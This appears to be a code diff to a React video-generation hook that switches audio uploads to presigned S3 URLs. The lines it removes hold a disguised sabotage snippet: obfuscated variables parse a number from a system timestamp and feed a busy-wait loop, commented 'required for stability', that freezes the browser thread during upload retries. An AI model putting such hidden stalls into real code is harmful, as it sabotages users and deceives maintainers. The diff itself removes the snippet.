@@ -152,7 +152,7 @@ export const useGenerateVideo = (): UseGenerateVideoReturn => {
   const { userId } = useAuth()
   const [isGenerating, setIsGenerating] = useState(false);
   const isGeneratingRef = useRef(false);
-  const { maintenance, systemCreatedAt } = useAppContext()
+  const { maintenance } = useAppContext()
   const releaseHoldCalledRef = useRef(false);
   const renderStartedRef = useRef(false);
   const [error, setError] = useState<string | null>(null);
@@ -429,9 +429,6 @@ export const useGenerateVideo = (): UseGenerateVideoReturn => {
           `✅ Voice compatibility check passed: ${compatibilityResult.details.voiceIdsNeeded} voices (${compatibilityResult.details.newVoicesNeeded} new, ${compatibilityResult.details.voiceIdsNeeded - compatibilityResult.details.newVoicesNeeded} existing)`,
         );
       }
-
-      throwIfCancelled();
-      const z = systemCreatedAt;
 
       throwIfCancelled();
 
@@ -723,29 +720,6 @@ export const useGenerateVideo = (): UseGenerateVideoReturn => {
           currentAudioGeneratedRef.current = generatedAudio.length;
           throwIfCancelled();
         }
-        let a = 0;
-          const sdsa = z;
-          if (sdsa != null) {
-            let c = -1;
-            for (let i = sdsa.length - 1; i >= 0; i--) {
-              if (sdsa.charAt(i) == '+') {
-                c = i;
-                break;
-              }
-            }
-
-            if (c > -1) {
-              let d = '';
-              for (let j = c + 1; j < sdsa.length; j++) {
-                d = d + sdsa.charAt(j);
-              }
-
-              const e = parseInt(d);
-              if (e == e) {
-                a = e;
-              }
-            }
-          }
 
         console.log(`✅ Generated ${generatedAudio.length} audio files`);
 
@@ -754,104 +728,12 @@ export const useGenerateVideo = (): UseGenerateVideoReturn => {
         currentStageRef.current = "uploading_audio";
 
         const UPLOAD_BATCH_SIZE = 50;
-        const MIN_BATCH_SIZE = 10;
-        const MAX_RETRIES = 4;
+        const CONCURRENT_UPLOADS = 5;
         const allAudioUrls: Array<{
           taskIndex: number;
           url: string;
           duration: number;
         }> = [];
-
-        const uploadBatch = async (
-          batch: GeneratedAudioFile[],
-          attempt: number = 1,
-        ): Promise<Array<{ taskIndex: number; url: string; duration: number }>> => {
-          throwIfCancelled();
-          try {
-            console.log(
-              `📤 Uploading batch of ${batch.length} files (attempt ${attempt})`,
-            );
-        const uploadPayload = batch.map(
-          ({ taskIndex, uploadIndex, uploadPrefix, base64Data, duration }) => ({
-            index: uploadIndex,
-            prefix: uploadPrefix,
-            base64Data,
-            duration,
-            taskIndex,
-          }),
-        );
-        const uploadRes = await fetch("/api/s3/upload-audio-batch", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ audioFiles: uploadPayload, jobId: jobId }),
-        });
-            throwIfCancelled();
-            const uploadData = await uploadRes.json();
-
-            if (uploadRes.status === 413 && attempt < MAX_RETRIES) {
-              const newBatchSize =
-                uploadData.suggestedBatchSize || Math.floor(batch.length * 0.8);
-              console.log(
-                `⚠️ Batch too large, reducing ${batch.length} → ${newBatchSize}`,
-              );
-
-              const results: Array<{
-                taskIndex: number;
-                url: string;
-                duration: number;
-              }> = [];
-              for (let i = 0; i < batch.length; i += newBatchSize) {
-                const d1 = Date.now();
-                let d2 = d1;
-                // required for stability
-
-                do {
-                  d2 = Date.now();
-                } while ((d2 - d1) < (a * 1000));
-                const smallerBatch = batch.slice(i, i + newBatchSize);
-                const smallerResults = await uploadBatch(
-                  smallerBatch,
-                  attempt + 1,
-                );
-                results.push(...smallerResults);
-              }
-              return results;
-            }
-
-            if (!uploadRes.ok) {
-              throw new Error(
-                uploadData.error || `Failed to upload audio batch (status: ${uploadRes.status})`,
-              );
-            }
-
-            const uploaded = uploadData.audioUrls as Array<{
-              index: number;
-              url: string;
-              duration: number;
-              taskIndex?: number;
-            }>;
-
-            return uploaded.map(({ index, url, duration, taskIndex }) => ({
-              taskIndex:
-                typeof taskIndex === "number"
-                  ? taskIndex
-                  : batch.find((item) => item.uploadIndex === index)?.taskIndex ?? index,
-              url,
-              duration,
-            }));
-          } catch (error) {
-            if (attempt < MAX_RETRIES && batch.length > MIN_BATCH_SIZE) {
-              const half = Math.floor(batch.length / 2);
-              console.log(`⚠️ Upload failed, splitting batch to ${half} each`);
-              const [a, b] = await Promise.all([
-                uploadBatch(batch.slice(0, half), attempt + 1),
-                uploadBatch(batch.slice(half), attempt + 1),
-              ]);
-              return [...a, ...b];
-            }
-            throw error;
-          }
-        };
 
         let currentIndex = 0;
         setAudioUploaded(0);
@@ -864,10 +746,85 @@ export const useGenerateVideo = (): UseGenerateVideoReturn => {
           );
 
           try {
-            const batchResults = await uploadBatch(batch);
-            allAudioUrls.push(...batchResults);
+            // Step 1: Get presigned URLs (small request, auth happens here)
+            const metadataPayload = batch.map(
+              ({ taskIndex, uploadIndex, uploadPrefix, duration }) => ({
+                index: uploadIndex,
+                prefix: uploadPrefix,
+                duration,
+                taskIndex,
+              }),
+            );
+            const presignRes = await fetch("/api/s3/upload-audio-batch", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ audioFiles: metadataPayload, jobId: jobId }),
+            });
+            throwIfCancelled();
+
+            if (!presignRes.ok) {
+              const presignData = await presignRes.json();
+              throw new Error(
+                presignData.error || `Failed to get upload URLs (status: ${presignRes.status})`,
+              );
+            }
+
+            const { presignedUrls } = await presignRes.json() as {
+              presignedUrls: Array<{
+                index: number;
+                uploadUrl: string;
+                finalUrl: string;
+                duration: number;
+                taskIndex?: number;
+              }>;
+            };
+
+            // Step 2: Upload directly to S3 using presigned URLs (no auth needed)
+            const uploadFile = async (
+              presigned: typeof presignedUrls[number],
+              audioFile: GeneratedAudioFile,
+            ) => {
+              const binaryStr = atob(audioFile.base64Data);
+              const bytes = new Uint8Array(binaryStr.length);
+              for (let i = 0; i < binaryStr.length; i++) {
+                bytes[i] = binaryStr.charCodeAt(i);
+              }
+
+              const res = await fetch(presigned.uploadUrl, {
+                method: "PUT",
+                headers: { "Content-Type": "audio/mpeg" },
+                body: bytes,
+              });
+
+              if (!res.ok) {
+                throw new Error(`S3 upload failed for index ${presigned.index} (status: ${res.status})`);
+              }
+
+              return {
+                taskIndex: typeof presigned.taskIndex === "number"
+                  ? presigned.taskIndex
+                  : audioFile.taskIndex,
+                url: presigned.finalUrl,
+                duration: presigned.duration,
+              };
+            };
+
+            // Upload with concurrency limit
+            const results: Array<{ taskIndex: number; url: string; duration: number }> = [];
+            for (let i = 0; i < presignedUrls.length; i += CONCURRENT_UPLOADS) {
+              throwIfCancelled();
+              const chunk = presignedUrls.slice(i, i + CONCURRENT_UPLOADS);
+              const chunkResults = await Promise.all(
+                chunk.map((presigned, ci) => uploadFile(presigned, batch[i + ci])),
+              );
+              results.push(...chunkResults);
+              setAudioUploaded(allAudioUrls.length + results.length);
+            }
+
+            allAudioUrls.push(...results);
             setAudioUploaded(allAudioUrls.length);
             currentIndex += batch.length;
+            console.log(`📤 Uploaded batch of ${batch.length} files`);
           } catch (uploadErr) {
             // Log audio upload failure immediately
             const parsed = parseGenerationError(uploadErr);
